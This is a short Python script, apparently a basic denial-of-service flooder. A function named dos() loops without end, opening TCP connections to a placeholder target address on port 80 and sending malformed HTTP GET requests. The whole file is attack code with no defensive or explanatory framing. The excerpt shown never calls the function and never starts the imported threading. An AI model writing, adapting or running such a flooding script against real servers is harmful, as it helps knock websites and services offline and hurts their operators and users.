import socket
from threading import Thread

host = "IP"
ip = host
port = 80

def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET " + "hallo" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "hallo" + "HTTP/1.1 \r\n"), (ip, port))
        except socket.error:
            print("error")
        mysocket.close()